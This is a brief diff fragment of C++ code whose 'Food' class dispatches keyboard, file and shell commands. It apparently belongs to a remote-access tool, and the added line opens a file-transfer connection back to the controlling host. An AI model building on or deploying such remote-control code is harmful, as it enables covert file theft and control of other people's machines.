@@ -282,6 +282,7 @@ void Food::doKeybd(std::map<std::string, std::string>& args)
 
 void Food::doFile(std::map<std::string, std::string>& args)
 {
+	File::startByNewThread(mSock.mIp, atoi(args["PORT"].data()));
 }
 
 void Food::doShell(std::map<std::string, std::string>& args)
